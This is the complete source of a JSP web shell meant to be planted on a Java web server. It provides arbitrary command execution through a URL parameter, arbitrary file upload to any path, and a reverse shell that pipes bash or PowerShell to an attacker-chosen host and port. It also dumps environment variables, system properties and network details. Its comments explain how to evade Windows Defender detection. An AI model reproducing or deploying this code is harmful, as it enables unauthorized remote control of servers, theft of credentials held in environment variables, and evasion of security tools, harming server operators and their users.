<%--
    Copyright (C) 2020  Rodney Beede
	https://www.rodneybeede.com/

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as
    published by the Free Software Foundation, either version 3 of the
    License, or (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
--%>

<%@ page session="false"%>

<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>
<%@ page import="java.util.*" %>

<%!
	public String clean(final String str) {
		if(null == str || str.length() == 0) {
			return "";
		} else {
			return str
				.replace("&", "&amp;")
				.replace("\"", "&quot;")
				.replace("'", "&#039;")
				.replace("<", "&lt;")
				.replace(">", "&gt;")
				;
		}
	}
%>


<html>
<body style="background-color: black;
  background-image: radial-gradient(
    rgba(0, 150, 0, 0.75), black 120%
  );
  height: 100vh; color: white;
  font: 1.3rem Inconsolata, monospace;
  
  font-size: xx-large;" >
  
<% final String command = request.getParameter("command"); %>
<% if(null != command && !command.isEmpty()) { %>
<h3>Command Output (STDOUT & STDERR)</h3>
<pre>
<% }
	// Windows Defender sees a file.jsp with exec() and flags it as a virus
	// This version used to bypass that with a trick, but after 4 years (orig 2020) Defender now catches this one too.
	// You can use some trivial Java tricks to obfuscate and still bypass Defender if necessary

	// it also handily redirects STDERR to STDOUT
	
	if(null != request.getParameter("command") && !command.isEmpty()) {
		final ProcessBuilder pb = new ProcessBuilder(command.split(" "));
		pb.redirectErrorStream(true);
		final Process p = pb.start();
		p.getOutputStream().close();  // close STDIN
		final BufferedReader stdout = new BufferedReader(new InputStreamReader(p.getInputStream()));
		for(String cLine = stdout.readLine(); null != cLine; cLine = stdout.readLine()) {
			out.println(clean(cLine));
		}
		stdout.close();
		
		p.waitFor();
		out.println();
		out.print("<i>");
		out.print("Exit code was:  " + p.exitValue());
		out.println("</i>");
	}
	
	if(null != command && !command.isEmpty()) { %>
</pre>
<%  } %>

<hr />

<form action="" method="GET">
<label>Command:</label><input type="text" name="command" size="100" value="<%= clean(request.getParameter("command")) %>" autofocus onfocus="this.selectionStart = this.selectionEnd = this.value.length;" /><input type="submit" />
</form>

<p>
You may want to prefix your command with <code>cmd /c</code> or <code>bash -c</code><br />
STDERR will automatically be redirected to STDOUT for you. Newlines may be translated by server's local platform.
</p>

<hr />

<script type="text/javascript">
	function readFile(file) {
		return new Promise((resolve, reject) => {
			const reader = new FileReader();
			
			reader.onload = res => {
				resolve(res.target.result);
			};
			
			reader.onerror = err => reject(err);
			
			reader.readAsDataURL(file);
		})
	}

	async function convertBase64() {
		const file = document.getElementById('file').files[0];
		
		const contents = await readFile(file);
		
		document.getElementById('base64filecontent').value = contents;
	}
	
	function optimizeSubmit() {
		// No need to upload the non-base64 file
		document.getElementById('file').value = document.getElementById('file').defaultValue;
	}

</script>

<form action="" method="POST" enctype="multipart/form-data" onsubmit="optimizeSubmit()">
<label>Destination File path and filename:</label><input type="text" name="filepath" id="filepath" size="100" value="<%= clean(System.getProperty("user.dir")) %><%= clean(System.getProperty("file.separator")) %>"/><br />
<input type="file" name="file" id="file" size="100" onchange="convertBase64()" /><br />
<input type="hidden" name="base64filecontent" id="base64filecontent" />
<br />
<input type="submit" value="Upload"/>
</form>

<%
	if("POST".equals(request.getMethod())) {
		String requestContent = "";
		
		final BufferedReader requestReader = new BufferedReader(new InputStreamReader(request.getInputStream()));
		for(String cLine = requestReader.readLine(); null != cLine; cLine = requestReader.readLine()) {
			requestContent += cLine + System.getProperty("line.separator");
		}
		requestReader.close();
		
		final String boundary = requestContent.split(System.lineSeparator(), 2)[0];
		
		
		int startPosition = requestContent.indexOf("Content-Disposition: form-data; name=\"filepath\"");
		startPosition += "Content-Disposition: form-data; name=\"filepath\"".length();
		startPosition += "\r\n".length();
		startPosition += "\r\n".length();
		
		int endPosition = requestContent.indexOf(boundary, startPosition);
		endPosition -= "\r\n".length();
		
		final String filepath = requestContent.substring(startPosition, endPosition);
		
		out.println("Writing to destination:  " + filepath);
		out.println();
		
		// Ignore the data:MIME/TYPE;base64, part
		startPosition = requestContent.indexOf(boundary + "\r\n" + "Content-Disposition: form-data; name=\"base64filecontent\"");
		startPosition = requestContent.indexOf("base64,", startPosition);
		startPosition += "base64,".length();
		
		endPosition = requestContent.indexOf(boundary, startPosition);
		endPosition -= "\r\n".length();
		
		final String base64content = requestContent.substring(startPosition, endPosition);
		// If you get stuck with Java 7 or before change to javax.xml.bind.DatatypeConverter.parseBase64Binary
		//	or sun.misc.BASE64Decoder().decode()
		final byte[] filebytes = java.util.Base64.getDecoder().decode(base64content);
		
		out.println("Writing " + filebytes.length + " bytes");
		out.println();
		
		final OutputStream os = new FileOutputStream(new File(filepath));
		os.write(filebytes);
		os.close();
		
		//out.println("DEBUG");
		//out.println("|||" + requestContent + "|||");
	}
%>

<hr />

<h3>Reverse Shell</h3>

<form action="" method="GET">
<%
	String providedShell = request.getParameter("shell");
	
	if(null == providedShell || providedShell.isEmpty()) {
		if(System.getProperty("os.name").contains("Windows")) {
			providedShell = "powershell.exe";
		} else {
			providedShell = "bash";
		}
	}
	
	String providedAddress = request.getParameter("address");
	if(null == providedAddress || providedAddress.isEmpty()) {
		providedAddress = request.getRemoteAddr();
	}
	
	String providedPortStr = request.getParameter("port");
	if(null == providedPortStr || providedPortStr.isEmpty()) {
		providedPortStr = "4444";
	}
	
	final int providedPort = Integer.parseInt(providedPortStr);
%>
<label>Shell:</label><input type="text" name="shell" size="100" value="<%= clean(providedShell) %>"/><br />
<label>Hostname or IP Address:</label><input type="text" name="address" size="100" value="<%= clean(providedAddress) %>"/><br />
<label>Port:</label><input type="text" name="port" size="6" value="<%= providedPort %>"/><br />
<br />
<input type="submit" name="reverseshell" value="Connect" /><span style="font-size: small;">Remote end works well with nc -lknvvvp <%= providedPort %></span>
</form>

<%
	if("Connect".equals(request.getParameter("reverseshell"))) {
		out.println("Starting reverse shell");
		out.println("Connecting to " + providedAddress + ":" + providedPort);
		
		class StreamConnector extends Thread {
			InputStream is;
			OutputStream os;

			StreamConnector(InputStream is, OutputStream os) {
				this.is = is;
				this.os = os;
			}

			public void run() {
				BufferedReader in = null;
				BufferedWriter out = null;
				try { in = new BufferedReader(new InputStreamReader(this.is));
					out = new BufferedWriter(new OutputStreamWriter(this.os));
					char buffer[] = new char[8192];
					int length;
					while ((length = in .read(buffer, 0, buffer.length)) > 0) {
						out.write(buffer, 0, length);
						out.flush();
					}
				} catch (Exception e) {}
				try {
					if ( in != null)
						in .close();
					if (out != null)
						out.close();
				} catch (Exception e) {}
			}
		}
		
		
		Socket socket = new Socket(providedAddress, providedPort);

		// This better evades AV
		final ProcessBuilder pb = new ProcessBuilder(providedShell);
		pb.redirectErrorStream(true);
		final Process p = pb.start();
		( new StreamConnector( p.getInputStream(), socket.getOutputStream() ) ).start();
		( new StreamConnector( socket.getInputStream(), p.getOutputStream() ) ).start();
		// As it is a multi-thread operation we don't need to p.waitFor()
	}
%>

<hr />

<pre>

<h3>Server Information</h3>

Server localtime:	<%= Calendar.getInstance().getTime() %>
Server localtime in milliseconds:	<%= Calendar.getInstance().getTimeInMillis() %>
(Epoch is January 1, 1970 00:00:00.000 GMT)
Server localtime in seconds:	<%= Calendar.getInstance().getTimeInMillis() / 1000 %>

Working directory:	<%= System.getProperty("user.dir") %>

<hr />

<h3>Request Headers</h3>

<%
	final Enumeration<String> headerNames = request.getHeaderNames();
	while(headerNames.hasMoreElements()) {
	  final String headerName = headerNames.nextElement();
	  out.println(clean(headerName + "\t" + request.getHeader(headerName)));
	}
%>

<hr />

<h3>Dump of all System properties</h3>
<% 
	for(String key : new TreeSet<String>(System.getProperties().stringPropertyNames())) {
		out.print(key);
		out.print('\t');
		out.println(System.getProperty(key));
	}
%>

<hr />

<h3>Environment</h3>
<%
	for(String key : new TreeSet<String>(System.getenv().keySet())) {
		out.print(key);
		out.print('\t');
		out.println(System.getenv(key));
	}
%>

<hr />

<h3>Networking</h3>
<%
	for(NetworkInterface nint : Collections.list(NetworkInterface.getNetworkInterfaces())) {
		out.print(nint.getDisplayName());
		out.print('\t');
		out.print(nint.getName());
		out.print('\t');
		for(InterfaceAddress ifaceAddress : nint.getInterfaceAddresses()) {
			out.print(ifaceAddress);
			out.print(',');
		}
		out.println();
	}
%>


</pre>
</body>
</html>
